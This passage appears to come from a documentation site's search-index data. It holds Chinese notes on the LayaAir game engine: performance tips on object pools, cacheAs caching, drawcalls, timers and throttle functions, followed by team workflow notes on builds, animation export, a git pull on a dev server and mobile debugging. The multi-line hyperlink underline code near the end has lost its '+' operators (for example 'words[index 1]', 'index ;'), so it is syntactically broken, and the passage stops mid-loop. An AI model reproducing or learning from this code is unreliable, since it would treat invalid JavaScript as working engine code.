非常简单时，比如一个字或者一个图片，设置cacheAs不但不提高性能，反而会损失性能。\n 2. 容器内有经常变化的内容，比如容器内有一个动画或者倒计时，如果再对这个容器设置cacheAs，会损失性能\n\n总的来说就是cacheAs 适合不经常变化的复杂内容，如果容器里有部分经常变化另外一部分不经常变化，可以考虑 分层管理。\n\n\n# 减少CPU使用量\n\n\n# 减少动态属性查找\n\n在对象的大量属性里查找一个属性会很耗时，如果后面频繁使用这个属性的话会更耗时，那就很有必要使用 局部变量 来保存它:\n\n\n# 计时器\n\nLaya.timer.frameLoop按帧执行，Laya.timer.loop按时间执行，使用Laya.timer.clear(this, this.xxx)可以清除其内部的Timer。\n\n\n# 对象边界\n\nsprite默认没有宽高，可以给它设置autoSize，也可以直接设置size（会使autoSize失效）。\n\n当sprite内很复杂时，也就是显示列表比较多时，getBounds需要计算边界，不是适合频繁调用（特别是设置autoSize时）。\n\n但sprite搭配texture展示图片时，必须在图片加载完的回调函数里设置size；可以直接 使用Texture的宽高赋予sprite的宽高，这样会很高效；此时获取宽高可以使用getGraphicsBounds（用于获取矢量绘图宽高）。\n\n\n# 根据活动状态改变帧频\n\nLaya.stage.frameRate=Laya.Stage.FRAME_FAST;\n\n * Stage.FRAME_FAST：fast模式，最高FPS为 显示器的最大帧率，如果显示器最大帧率是60，则最大FPS为60，显示器最大帧率是120，则最大FPS为120。\n * Stage.FRAME_SLOW：slow模式，最高FPS为 显示器最大帧率的一半，在游戏运行的过程中，引擎会隔帧丢弃。如果实际可以达到40帧，那游戏最终帧率只是20，如果帧率能达到100，那最终帧只能是50。\n * Stage.FRAME_MOUSE：mouse模式则选择性在fast模式与slow模式之间 切换，有时并不需要让游戏以满帧速率执行，比如60帧满帧的时候，30FPS已经能够满足多数情况下人类视觉的响应，但是鼠标交互时，30FPS可能会造成画面的不连贯，于是Stage.FRAME_MOUSE应运而生。\n\n\n# 分批加载资源\n\n资源 加载后 引擎就会开始 处理图片等资源，如果加载的是一张图集，会处理每张子图片，如果一次性处理大量的图片，可能会 卡顿；\n所以可以在游戏中 分批加载资源，以减少CPU的计算； 在资源使用后并且后面也不会再使用了，那就可以予以卸载，释放内存。\n\n\n# 使用callLater\n\ncallLater使代码块延迟至本帧渲染前执行。如果当前的操作频繁改变某对象的状态，此时可以考虑使用callLater，以减少重复计算。\n\nvar rotation = 0, scale = 1, position = 0;\nprivate setRotation(value) {\n    this.rotation=value;\n    update();\n    // update()改为Laya.timer.callLater(this, update);\n}\nprivate setScale(value) {\n    this.scale = value;\n    update();\n    // update()改为Laya.timer.callLater(this, update);\n}\nprivate setPosition(value) {\n    this.position = value;\n    update();\n    // update()改为Laya.timer.callLater(this, update);\n}\npublic update() {\n    console.log('rotation: ' + this.rotation + '\\tscale: ' + this.scale + '\\tposition: ' + this.position);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 使用节流器\n\n节流器常用于限制鼠标频繁点击、滚动条滑动时去频繁调用change函数等场景\n\n/**\n * 节流器1：先执行再延时，“相对实时”效果最好，但是最后一次关键点触发可能会被节流掉\n * fn：执行函数\n * wait：等待时间\n */\nfunction throttle(fn, wait) {\n    let timer = null;\n    return function () {\n        if (!timer) {\n            fn && fn.apply(this, arguments);\n            timer = setTimeout(() => {\n                timer = null;\n            }, wait);\n        }\n    }\n}\n/**\n * 节流器2：先延时再执行，有较好的“相对实时”的效果，并且最后一次触发不会被节流掉\n * fn：执行函数\n * wait：等待时间\n */\nfunction throttle2(fn, wait) {\n    let timer = null;\n    return function () {\n        if (!timer) {\n            timer = setTimeout(() => {\n                // 这里的this和arguments就是return function这个函数的this和arguments\n                //（箭头函数没有自己的this，arguments，super或new.target）\n                fn && fn.apply(this, arguments);\n                timer = null;\n            }, wait)\n        }\n    }\n}\n/**\n * 节流器3：先延时后执行，“相对实时”的效果很差（定时器一直会被覆盖），但最后一次触发不会被节流\n * fn：执行函数\n * wait：等待时间\n */\nconst throttle3 = function (fn, wait) {\n    let timer = null;\n    return function () {\n        timer && clearTimeout(timer);\n        timer = setTimeout(() => {\n            fn && fn.apply(this, arguments);\n        }, wait);\n    }\n};\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n\n\n# 其它优化策略\n\n 1. 粒子属于矢量绘制，大量使用粒子对CPU压力大，在移动平台 Canvas 模式下，尽量不用粒子；WebGL模式下可以采用 GPU运算，能减轻CPU压力，但也要尽量 控制、减少使用量。\n 2. Canvas 模式尽量减少 旋转、缩放、alpha等属性 的使用，这些属性会对性能产生消耗；如要使用，建议在 WebGL 模式下使用；\n 3. 由于Timer的loop()与frameLoop()方法里会不断的循环执行，当创建对象及复杂计算时，会导致大量的性能消耗出现在循环里，因此， 尽可能不要在循环里创建对象及复杂计算。\n 4. 项目中尽量减少try catch的使用，被try catch的函数执行会变得非常慢。",normalizedContent:"# 性能优化\n\n\n# 性能统计面板\n\nlaya引擎内置有性能统计面板，可实时检测当前性能。在init()后添加 **laya.stat.show(0,0);**代码即可以性能统计面板（参数是位置）。\n\n\n * fps：每秒传输帧数(frames per second)，有fps(canvas)和fps(webgl)两种显示，第一个值是 fps帧速，越高越好，第二个值是 每帧渲染所消耗的时间（毫秒），越小越好；这两个值如果不能维持在满帧，一般是正在操作页面。\n * sprite：统计 所有渲染节点（包括容器）数量，反映了 引擎节点遍历、数据组织和渲染的次数 。数字 越低越好，在ui设计时尽可能减少不必要的节点以及嵌套。\n * drawcall：canvas模式下表示 每帧的绘制次数，包括图片、文字、矢量图；webgl模式下表示 渲染提交批次，每次准备数据并通知gpu渲染绘制的过程称为1次drawcall，在每1次drawcall中除了在通知gpu的渲染上比较耗时之外，切换材质与shader也是非常耗时的操作。drawcall是 越少越好，建议开发者尽量限制在100之下。\n * curmem：webgl模式下表示 内存与显存的占用；canvas模式下（没显存概念）表示 内存的占用情况。值越低越好。\n * shader：webgl模式独有的性能指标，表示 每帧shader提交次数，值越低越好。\n * canvas：只有设置cacheas后，canvas才会有值，否则默认为0/0/0。从左至右数值的意义分别为：每帧重绘的画布数量 / 缓存类型为“normal”类型的画布数量 / 缓存类型为“bitmap”类型的画布数量\n\n\n# 内存优化\n\n\n# 使用对象池优化\n\n游戏中某类的对象 不停创建和移除，可以使用 对象池 让对象复用，这样可以减少 新内存的分配 还有 垃圾回收器运行的机会（垃圾回收时也耗内存）。\n\n// 参数1是这类对象的标识符，参数2是类；返回一个对象（没有就新建这一类的对象池，有就从对象池里取）\nlaya.pool.getitembyclass('img', laya.image);\n// 参数1是这类对象的标识符，回收的对象\nlaya.pool.recover('img', img1);\n\n\n1\n2\n3\n4\n\n\n如果自己实现一个对象池呢？可以使用 map，key使用类名，value就是对象数组。\n\n\n# 使用handler.create\n\n\n\n分批加载资源，第一批资源加载完成，触发laya.handler.create()创建的complete事件回调方法后 被对象池回收；需要加载第二批资源时，laya.handler.create()会首先 在对象池中检索相同的 回调方法处理器，这样节省了内存开销。\n\nlaya.loader.load(urls, laya.handler.create(this, this.onassetloaded));\n\n\n1\n\n\n但是如果要显示加载资源的进度这个时候需要格外注意，可能会这样写（只会显示一次加载进度）：\n\nlaya.loader.load(urls, laya.handler.create(this, this.onassetloaded), laya.handler.create(this, this.onloading));\n\n\n1\n\n\n因为要持续显示加载进度，但是handler.create 默认执行一次就会收到对象（只会显示一次加载进度），那么就需要 关闭 handler.create的 对象池回收：\n\nlaya.loader.load(urls, laya.handler.create(this,this.onassetloaded), laya.handler.create(this,this.onloading, null, false));\n\n// 或者使用handler的实例，它的实例里是没有对象回收池\nlaya.loader.load(urls, laya.handler.create(this,this.onassetloaded), new laya.handler(this, this.onloading));\n\n\n1\n2\n3\n4\n\n\n\n# 内存释放\n\n垃圾回收前，要确保对象所有的引用都被删除了：\n\n//创建一个sprite实例\nvar sp:laya.sprite = new laya.sprite();\n//将sp内部引用设置为null\nsp.destroy();\n\n\n1\n2\n3\n4\n\n\njs垃圾回收机制只有在 内存足够低 时才运行，或者 内存分配 也会触发。\n\n\n# 资源卸载\n\n游戏会分批加载资源，有些资源就用那么一次后面就不会再用了，那么可以在使用后对其进行 资源卸载\n\nconst assets: array<any> = [];\nassets.push(\"res/apes/monkey0.png\");\nassets.push(\"res/apes/monkey1.png\");\nfor (let i = 0; i < assets.length; i ++) {\n    //查看log，清理前资源一直在内存中\n    console.log(laya.loader.getres(assets[i]));\n    //调用清理方法\n    laya.loader.clearres(assets[i]);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 关于滤镜、遮罩\n\n如果不是动态使用滤镜、遮罩等，可以直接使用 ps 等工具制作图片的 滤镜、遮罩效果； 但是如果要在引擎中 动态使用滤镜、遮罩，这样很耗性能，因为它再引擎中会创建两个位图，一个用于原图的栅格化版本，一个用于生成滤镜或遮罩版本，在动态改变时两个位图会重新创建，占用内存也占用cpu的计算。\n\n\n# 渲染优化\n\n\n# 优化sprite\n\n 1. 减少不必要的sprite和层次嵌套；\n 2. 非可见区域对象尽量移除或设置visible=false；\n 3. 可以考虑使用panel，因为panel可视区域外的直接子节点不会进行渲染；\n 4. 尽量让 动态内容和静态内容 分开，容器内静态内容不会经常变化，可以对容器设置cacheas属性来优化节点数或drawcall。\n\n\n# 优化drawcall\n\n 1. 尽量保证同图集的图片渲染顺序是挨着的，如果不同图集交叉渲染，会增加drawcall数量；\n 2. 尽量保证同一个面板中的所有资源用一个图集，这样能减少drawcall。\n\n\n# 其他\n\n 1. 描边的文本会比没有描边的多调用一次绘图指令，动态的描边文本并且总字符少的可以使用“切片组件”，静态的可以使用cacheas降低性能消耗；\n\n 2. 文本始终只有一行，并且样式始终不变的，在内容改变时可以使用text.changetext\n    \n    this.text.text=\"text\";\n     laya.stage.addchild(this.text);\n     //后面只是更新文字内容，使用changetext能提高性能\n     this.text.changetext(\"text changed.\");\n    \n    \n    1\n    2\n    3\n    4\n    \n\n\n# cacheas静态缓存优化\n\n\n# 什么是cacheas\n\n设置cacheas可以将显示对象 缓存为静态图像，当子对象发生变化时会自动重新缓存；\n建议把 不经常变化的复杂内容 设置cacheas，能极大提高渲染性能；\n设置cacheas后，还可以设置staticcache=true以阻止自动更新缓存，同时可以手动调用recache方法更新缓存。\n\n\n# cacheas的几种缓存模式\n\n * “none”时，不做任何缓存。\n * “normal”时，canvas下进行画布缓存，webgl模式下进行命令缓存；该模式性能优化中等，它能减少每帧渲染的节点数，但不会减少drawcall数和shader数。\n * “bitmap”时，canvas下进行依然是画布缓存，webgl模式下使用rendertarget缓存；rendertarget缓存模式有2048大小限制，超出2048会额外增加内存开销；另外，不断重绘时开销也比较大，但是会减少drawcall，渲染性能最高。\n\n\n# 测试是否频繁重绘\n\nlaya提供的debugpanel调试工具可以查看游戏重绘区，使用时在代码里增加 debugpanel.init();。\n\n观察ui是否频繁重绘\n\n勾选 “显示当前cache重绘” 选项或 “显示所有重绘区域” 选项，如果ui进行重绘了，重绘区域会显示出绿色框线，绿色框的左上角显示了重绘次数与重绘时间，性能统计工具的sprite、drawcall等也会发生改变。\n\n\n# 如何选择缓存模式\n\ncpu方面：假如开启了debugpanel调试工具，如果 绿色线框频繁出现，说明ui在频繁的重绘，那么 最好不要 用bitmap模式，normal模式 可以酌情考虑。因为缓存位图时子对象一旦发生改变，那么引擎会自动重新缓存位图，缓存位图的过程会消耗cpu。\n\n可以把ui进行 分层管理，频繁更新的为一层（不使用cacheas），不频繁更新的为一层（使用cacheas），这种方法也能提高性能。\n\n内存方面：bitmap模式会比normal模式 多占用一些内存，但只要ui的宽高不是很大，bitmap模式多占用的内存 也不会太大。\n\n\n# 低端机型的配置因素\n\n对于一些低端机来说，cpu与内存不高，如果为了提高渲染性能使用了cacheas，有可能就会出现问题。如果还是选择适应更多的低端机型，那就需要反复去测试，是否使用cacheas，还要对比normal与bitmap模式哪种更适合，在优化性能的情况下尽量减少cpu和内存损耗。\n\n\n# 什么情况下不能使用cacheas\n\n 1. 当对象 非常简单时，比如一个字或者一个图片，设置cacheas不但不提高性能，反而会损失性能。\n 2. 容器内有经常变化的内容，比如容器内有一个动画或者倒计时，如果再对这个容器设置cacheas，会损失性能\n\n总的来说就是cacheas 适合不经常变化的复杂内容，如果容器里有部分经常变化另外一部分不经常变化，可以考虑 分层管理。\n\n\n# 减少cpu使用量\n\n\n# 减少动态属性查找\n\n在对象的大量属性里查找一个属性会很耗时，如果后面频繁使用这个属性的话会更耗时，那就很有必要使用 局部变量 来保存它:\n\n\n# 计时器\n\nlaya.timer.frameloop按帧执行，laya.timer.loop按时间执行，使用laya.timer.clear(this, this.xxx)可以清除其内部的timer。\n\n\n# 对象边界\n\nsprite默认没有宽高，可以给它设置autosize，也可以直接设置size（会使autosize失效）。\n\n当sprite内很复杂时，也就是显示列表比较多时，getbounds需要计算边界，不是适合频繁调用（特别是设置autosize时）。\n\n但sprite搭配texture展示图片时，必须在图片加载完的回调函数里设置size；可以直接 使用texture的宽高赋予sprite的宽高，这样会很高效；此时获取宽高可以使用getgraphicsbounds（用于获取矢量绘图宽高）。\n\n\n# 根据活动状态改变帧频\n\nlaya.stage.framerate=laya.stage.frame_fast;\n\n * stage.frame_fast：fast模式，最高fps为 显示器的最大帧率，如果显示器最大帧率是60，则最大fps为60，显示器最大帧率是120，则最大fps为120。\n * stage.frame_slow：slow模式，最高fps为 显示器最大帧率的一半，在游戏运行的过程中，引擎会隔帧丢弃。如果实际可以达到40帧，那游戏最终帧率只是20，如果帧率能达到100，那最终帧只能是50。\n * stage.frame_mouse：mouse模式则选择性在fast模式与slow模式之间 切换，有时并不需要让游戏以满帧速率执行，比如60帧满帧的时候，30fps已经能够满足多数情况下人类视觉的响应，但是鼠标交互时，30fps可能会造成画面的不连贯，于是stage.frame_mouse应运而生。\n\n\n# 分批加载资源\n\n资源 加载后 引擎就会开始 处理图片等资源，如果加载的是一张图集，会处理每张子图片，如果一次性处理大量的图片，可能会 卡顿；\n所以可以在游戏中 分批加载资源，以减少cpu的计算； 在资源使用后并且后面也不会再使用了，那就可以予以卸载，释放内存。\n\n\n# 使用calllater\n\ncalllater使代码块延迟至本帧渲染前执行。如果当前的操作频繁改变某对象的状态，此时可以考虑使用calllater，以减少重复计算。\n\nvar rotation = 0, scale = 1, position = 0;\nprivate setrotation(value) {\n    this.rotation=value;\n    update();\n    // update()改为laya.timer.calllater(this, update);\n}\nprivate setscale(value) {\n    this.scale = value;\n    update();\n    // update()改为laya.timer.calllater(this, update);\n}\nprivate setposition(value) {\n    this.position = value;\n    update();\n    // update()改为laya.timer.calllater(this, update);\n}\npublic update() {\n    console.log('rotation: ' + this.rotation + '\\tscale: ' + this.scale + '\\tposition: ' + this.position);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 使用节流器\n\n节流器常用于限制鼠标频繁点击、滚动条滑动时去频繁调用change函数等场景\n\n/**\n * 节流器1：先执行再延时，“相对实时”效果最好，但是最后一次关键点触发可能会被节流掉\n * fn：执行函数\n * wait：等待时间\n */\nfunction throttle(fn, wait) {\n    let timer = null;\n    return function () {\n        if (!timer) {\n            fn && fn.apply(this, arguments);\n            timer = settimeout(() => {\n                timer = null;\n            }, wait);\n        }\n    }\n}\n/**\n * 节流器2：先延时再执行，有较好的“相对实时”的效果，并且最后一次触发不会被节流掉\n * fn：执行函数\n * wait：等待时间\n */\nfunction throttle2(fn, wait) {\n    let timer = null;\n    return function () {\n        if (!timer) {\n            timer = settimeout(() => {\n                // 这里的this和arguments就是return function这个函数的this和arguments\n                //（箭头函数没有自己的this，arguments，super或new.target）\n                fn && fn.apply(this, arguments);\n                timer = null;\n            }, wait)\n        }\n    }\n}\n/**\n * 节流器3：先延时后执行，“相对实时”的效果很差（定时器一直会被覆盖），但最后一次触发不会被节流\n * fn：执行函数\n * wait：等待时间\n */\nconst throttle3 = function (fn, wait) {\n    let timer = null;\n    return function () {\n        timer && cleartimeout(timer);\n        timer = settimeout(() => {\n            fn && fn.apply(this, arguments);\n        }, wait);\n    }\n};\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n\n\n# 其它优化策略\n\n 1. 粒子属于矢量绘制，大量使用粒子对cpu压力大，在移动平台 canvas 模式下，尽量不用粒子；webgl模式下可以采用 gpu运算，能减轻cpu压力，但也要尽量 控制、减少使用量。\n 2. canvas 模式尽量减少 旋转、缩放、alpha等属性 的使用，这些属性会对性能产生消耗；如要使用，建议在 webgl 模式下使用；\n 3. 由于timer的loop()与frameloop()方法里会不断的循环执行，当创建对象及复杂计算时，会导致大量的性能消耗出现在循环里，因此， 尽可能不要在循环里创建对象及复杂计算。\n 4. 项目中尽量减少try catch的使用，被try catch的函数执行会变得非常慢。",charsets:{cjk:!0}},{title:"Laya游戏开发注意事项",frontmatter:{},regularPath:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/",relativePath:"book-web/LayaBox游戏引擎/README.md",key:"v-2beb3a85",path:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/",headers:[{level:2,title:"用LAYA开发组件",slug:"用laya开发组件",normalizedTitle:"用laya开发组件",charIndex:19},{level:2,title:"代码上传到开发环境",slug:"代码上传到开发环境",normalizedTitle:"代码上传到开发环境",charIndex:561},{level:2,title:"动画上传",slug:"动画上传",normalizedTitle:"动画上传",charIndex:929},{level:2,title:"环境上拉代码",slug:"环境上拉代码",normalizedTitle:"环境上拉代码",charIndex:1466},{level:2,title:"chrome的devtool",slug:"chrome的devtool",normalizedTitle:"chrome的devtool",charIndex:1562},{level:2,title:"手机端调试",slug:"手机端调试",normalizedTitle:"手机端调试",charIndex:1649},{level:2,title:"MD5值问题",slug:"md5值问题",normalizedTitle:"md5值问题",charIndex:1815},{level:2,title:"laya项目设置",slug:"laya项目设置",normalizedTitle:"laya项目设置",charIndex:2053},{level:2,title:"富文本多行下划线",slug:"富文本多行下划线",normalizedTitle:"富文本多行下划线",charIndex:2068}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"用LAYA开发组件 代码上传到开发环境 动画上传 环境上拉代码 chrome的devtool 手机端调试 MD5值问题 laya项目设置 富文本多行下划线",content:'# Laya游戏开发注意事项\n\n\n# 用LAYA开发组件\n\n 1. 用LayaAirIDE打开laya项目，使用UI设计模式界面把UI都拼好，这些UI在“laya项目/bin”里。\n\n 2. 使用“导出”“发布”将拼好的UI导出来，导出的东西在“laya项目/bin”里。\n\n 3. 把“laya项目/bin/images”里自己的文件夹放到“开发项目/build/images”里；把“laya项目/bin/res/images”里自己的文件夹放到“开发项目/build/res/images”里。\n\n 4. 把“laya项目/src/ui”里的layaUI.max.all.js(要改名)放到“开发项目/build/js/ui”里。\n\n 5. (如果需要的话)在“开发项目/build/html”里的paopao.html和staticHtml.html文件里新增一行:\n    \n    <script type="text/javascript" src="../js/ui/layaUI.max.all1.js"><\/script>\n    \n    \n    1\n    \n\n 6. 在“开发项目/build/js/views/components”继承那些拼好的UI，在modules使用这些组件。\n\n\n# 代码上传到开发环境\n\n 1. 停止测试环境的运行，去webpack.config.js里将//filename:\'../../index.html\'注释放开\n 2. 在命令行里运行npm run webpack-pro，进行项目的打包；如果只修改了js，就把”开发项目/build/js/dist”里的bundle.js和bundle.js.map替换掉开发环境的对应文件\n 3. 如果修改了UI，就把”开发项目/build”里的images和res替换掉开发环境的对应文件夹；还要把”开发项目/build/js/ui”里的文件替换掉开发环境的对应文件\n 4. 开发环境的目录是”\\gameHall\\www\\files\\game\\bubble”\n 5. 记得把//filename:\'../../index.html’注释还原\n\n\n# 动画上传\n\n 1. 拿到动画资源，使用DragonBones打开\n\n 2. 使用快捷键Command+E导出\n\n 3. 导出的文件夹里会出现三个文件，xxx_ske.json、xxx_tex.json、xxx_tex.png\n\n 4. 使用Laya IDE打开刚刚这个导出的文件夹，使用工具“龙骨动画转换”\n\n 5. 会在这个文件夹里生成xxx.png 和 xxx.sk\n\n 6. 将这两个文件拷贝到“开发项目/build/res/dragonBones”文件夹里\n\n 7. 代码里createSkeleton加载资源，再添加到UI里，然后定位，最后play播放\n    \n    this.classicAni = Sail.Utils.createSkeleton(\'./res/dragonBones/classic\');\n    this.hallUI.btn_classic.addChild(this.classicAni)\n    this.classicAni.pos(279,147);\n    this.classicAni.play(\'wait01\',true);\n    \n    \n    1\n    2\n    3\n    4\n    \n\n\n# 环境上拉代码\n\nssh www@21.58.201.34\ncd /data/httpd/wangguoxiang/wap\ngit branch\ngit pull\n\n\n1\n2\n3\n4\n\n\n\n# chrome的devtool\n\n微信调试工具（科学上网）chrome://inspect/#devices 如果没出现调试链接，可能是手机USB在电脑上的驱动有问题\n\n\n# 手机端调试\n\n本地代码使用手机浏览器打开，保证手机和电脑在同一网段（例如手机开热点给电脑），再把package.json改成下面这个，ip地址自己更换一下例如192.168.43.61 "webpack-dev-server --host 192.168.43.61 --config webpack.config.js"\n\n\n# MD5值问题\n\n原因：后端文件编码为UNIX，前端文件编码为PC，生成的MD5不一样 根本原因：windows下使用git拉取源码文件编码问题 解决方案：\n\n 1. 前端修改一下GIT配置git config --global core.autocrlf false\n 2. gameHall上的index.html有7个文件要单独生成md5值，这7个文件要先用EditPlus检查一下编码，如果编码为PC可以用EditPlus改为UNIX编码保存之后再生成md5值\n\n\n# laya项目设置\n\n\n\n\n# 富文本多行下划线\n\n__proto.renderSelfToGraphic=function(graphic,gX,gY,recList){\n    var cssStyle=this.style;\n    var words=this._getWords();\n    var i=0,len=0;\n    if (words){\n        len=words.length;\n        var a;\n        if (cssStyle){\n            var font=cssStyle.font;\n            var color=cssStyle.color;\n            if (cssStyle.stroke){\n                var stroke=cssStyle.stroke;\n                stroke=parseInt(stroke);\n                var strokeColor=cssStyle.strokeColor;\n                graphic.fillBorderWords(words,gX,gY,font,color,strokeColor,stroke);\n                }else {\n                graphic.fillWords(words,gX,gY,font,color);\n            }\n            if (this.href){\n                var lastIndex=words.length-1;\n                var lastWords=words[lastIndex];\n                var lineY=lastWords.y lastWords.height;\n                const arr = []; // 存储每行最后一个字符的索引\n                if(cssStyle.textDecoration!="none"){\n                    // 超链接换行，考虑换多行的情况，开始字符和结束字符不在同一行就判定是超链接换行\n                    if(words[0].y != words[words.length-1].y){\n                        let index = 0;\n                        let slsIndex;//secondLineStartIndex\n                        while (true) {\n                            while(true){\n                                if (index == words.length - 1) {// 遍历到最后一个了\n                                    slsIndex = index;\n                                    arr.push(slsIndex);\n                                    break;\n                                }\n                                // 每一行的最后一个字符的索引\n                                if(words[index].y != words[index 1].y){\n                                    slsIndex = index;\n                                    arr.push(slsIndex);\n                                    break;\n                                }\n                                index ;\n                            }\n                            // 它是最后一行吗\n                            if (words[slsIndex].y == words[words.length - 1].y) {\n                                break;\n                            } else {\n                                index = slsIndex 1;\n                            }\n                        }\n                        for (let i = 0; i < arr.length; i ) {\n                            let firstX = (i == 0) ? 0 : arr[i - 1] 1;// 每行最开始字符的索引\n                            let firstlineY = words[firstX].y words[firstX].height;\n                            graphic.drawLine(words[firstX].x,firstlineY,words[arr[i]].x words[arr[i]].width,firstlineY,color,1);\n                        }\n                    }else{\n                        graphic.drawLine(words[0].x,lineY,lastWords.x lastWords.width,lineY,color,1);\n                    }\n                }\n                const hitArr = [];\n                var hitRec=HTMLHitRect.create();\n                if (words[0].y != words[words.length - 1].y) {\n                    for (let i = 0; i < arr.length; i ) {\n                        let firstX = (i == 0) ? 0 : arr[i - 1] 1;// 每行最开始字符的索引\n                        const hitRecNew = HTMLHitRect.create();\n                        hitRecNew.rec.setTo(words[firstX].x,words[firstX].y,words[arr[i]].x words[arr[i]].width-words[firstX].x,words[firstX].height);\n                        hitRecNew.href=this.href;// 每段点击区域都要加这个，否则Event.LINK解析不出参数\n                        hitArr.push(hitRecNew);\n                    }\n                } else {\n                    hitRec.rec.setTo(words[0].x,lastWords.y,lastWords.x lastWords.width-words[0].x,lastWords.height);\n                }\n                hitRec.href=this.href;\n                recList.push(hitRec);\n                for (let i = 0; i < hitArr.length; i ) {\n                    recList.push(hitArr[i]);\n                }\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n',normalizedContent:'# laya游戏开发注意事项\n\n\n# 用laya开发组件\n\n 1. 用layaairide打开laya项目，使用ui设计模式界面把ui都拼好，这些ui在“laya项目/bin”里。\n\n 2. 使用“导出”“发布”将拼好的ui导出来，导出的东西在“laya项目/bin”里。\n\n 3. 把“laya项目/bin/images”里自己的文件夹放到“开发项目/build/images”里；把“laya项目/bin/res/images”里自己的文件夹放到“开发项目/build/res/images”里。\n\n 4. 把“laya项目/src/ui”里的layaui.max.all.js(要改名)放到“开发项目/build/js/ui”里。\n\n 5. (如果需要的话)在“开发项目/build/html”里的paopao.html和statichtml.html文件里新增一行:\n    \n    <script type="text/javascript" src="../js/ui/layaui.max.all1.js"><\/script>\n    \n    \n    1\n    \n\n 6. 在“开发项目/build/js/views/components”继承那些拼好的ui，在modules使用这些组件。\n\n\n# 代码上传到开发环境\n\n 1. 停止测试环境的运行，去webpack.config.js里将//filename:\'../../index.html\'注释放开\n 2. 在命令行里运行npm run webpack-pro，进行项目的打包；如果只修改了js，就把”开发项目/build/js/dist”里的bundle.js和bundle.js.map替换掉开发环境的对应文件\n 3. 如果修改了ui，就把”开发项目/build”里的images和res替换掉开发环境的对应文件夹；还要把”开发项目/build/js/ui”里的文件替换掉开发环境的对应文件\n 4. 开发环境的目录是”\\gamehall\\www\\files\\game\\bubble”\n 5. 记得把//filename:\'../../index.html’注释还原\n\n\n# 动画上传\n\n 1. 拿到动画资源，使用dragonbones打开\n\n 2. 使用快捷键command+e导出\n\n 3. 导出的文件夹里会出现三个文件，xxx_ske.json、xxx_tex.json、xxx_tex.png\n\n 4. 使用laya ide打开刚刚这个导出的文件夹，使用工具“龙骨动画转换”\n\n 5. 会在这个文件夹里生成xxx.png 和 xxx.sk\n\n 6. 将这两个文件拷贝到“开发项目/build/res/dragonbones”文件夹里\n\n 7. 代码里createskeleton加载资源，再添加到ui里，然后定位，最后play播放\n    \n    this.classicani = sail.utils.createskeleton(\'./res/dragonbones/classic\');\n    this.hallui.btn_classic.addchild(this.classicani)\n    this.classicani.pos(279,147);\n    this.classicani.play(\'wait01\',true);\n    \n    \n    1\n    2\n    3\n    4\n    \n\n\n# 环境上拉代码\n\nssh www@21.58.201.34\ncd /data/httpd/wangguoxiang/wap\ngit branch\ngit pull\n\n\n1\n2\n3\n4\n\n\n\n# chrome的devtool\n\n微信调试工具（科学上网）chrome://inspect/#devices 如果没出现调试链接，可能是手机usb在电脑上的驱动有问题\n\n\n# 手机端调试\n\n本地代码使用手机浏览器打开，保证手机和电脑在同一网段（例如手机开热点给电脑），再把package.json改成下面这个，ip地址自己更换一下例如192.168.43.61 "webpack-dev-server --host 192.168.43.61 --config webpack.config.js"\n\n\n# md5值问题\n\n原因：后端文件编码为unix，前端文件编码为pc，生成的md5不一样 根本原因：windows下使用git拉取源码文件编码问题 解决方案：\n\n 1. 前端修改一下git配置git config --global core.autocrlf false\n 2. gamehall上的index.html有7个文件要单独生成md5值，这7个文件要先用editplus检查一下编码，如果编码为pc可以用editplus改为unix编码保存之后再生成md5值\n\n\n# laya项目设置\n\n\n\n\n# 富文本多行下划线\n\n__proto.renderselftographic=function(graphic,gx,gy,reclist){\n    var cssstyle=this.style;\n    var words=this._getwords();\n    var i=0,len=0;\n    if (words){\n        len=words.length;\n        var a;\n        if (cssstyle){\n            var font=cssstyle.font;\n            var color=cssstyle.color;\n            if (cssstyle.stroke){\n                var stroke=cssstyle.stroke;\n                stroke=parseint(stroke);\n                var strokecolor=cssstyle.strokecolor;\n                graphic.fillborderwords(words,gx,gy,font,color,strokecolor,stroke);\n                }else {\n                graphic.fillwords(words,gx,gy,font,color);\n            }\n            if (this.href){\n                var lastindex=words.length-1;\n                var lastwords=words[lastindex];\n                var liney=lastwords.y lastwords.height;\n                const arr = []; // 存储每行最后一个字符的索引\n                if(cssstyle.textdecoration!="none"){\n                    // 超链接换行，考虑换多行的情况，开始字符和结束字符不在同一行就判定是超链接换行\n                    if(words[0].y != words[words.length-1].y){\n                        let index = 0;\n                        let slsindex;//secondlinestartindex\n                        while (true) {\n                            while(true){\n                                if (index == words.length - 1) {// 遍历到最后一个了\n                                    slsindex = index;\n                                    arr.push(slsindex);\n                                    break;\n                                }\n                                // 每一行的最后一个字符的索引\n                                if(words[index].y != words[index 1].y){\n                                    slsindex = index;\n                                    arr.push(slsindex);\n                                    break;\n                                }\n                                index ;\n                            }\n                            // 它是最后一行吗\n                            if (words[slsindex].y == words[words.length - 1].y) {\n                                break;\n                            } else {\n                                index = slsindex 1;\n                            }\n                        }\n                        for (let i = 0; i < 